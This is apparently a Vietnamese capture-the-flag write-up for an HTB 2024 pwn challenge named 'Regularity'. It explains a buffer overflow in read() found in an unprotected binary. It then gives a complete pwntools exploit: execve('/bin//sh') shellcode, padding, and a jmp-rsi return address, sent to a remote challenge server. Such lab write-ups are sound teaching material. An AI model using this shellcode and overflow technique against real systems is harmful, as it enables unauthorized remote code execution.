# REGULARITY

> Cate: Pwn

# Description

Challenge cho chúng ta duy nhất file regularity.

Sử dụng lệnh checksec, ta thấy file không có chế độ bảo vệ gì cả.

![img](/HTB2024/pwn_regularity/Images/checksec.png)

Sử dụng IDA64 dịch ngược file, nhận thấy có một lỗ hổng tràn bộ đệm to đùng ở hàm read().

![img](/HTB2024/pwn_regularity/Images/vuln.png)

# Exploit


```python
from pwn import *

p = remote("94.237.56.137", 30190)

context.arch = 'amd64'

shellcode = asm(
f'''
xor rdi, rdi
push rdi
mov rdi, 0x68732f2f6e69622f
push rdi
mov rdi, rsp
xor rdx, rdx
xor rsi, rsi
xor rax, rax
add al, 0x3b
syscall
''')

jmp_rsi = 0x401041

payload = shellcode + b"a" * (256-len(shellcode)) + p64(0x401041)
p.sendline(payload)

p.interactive()
```
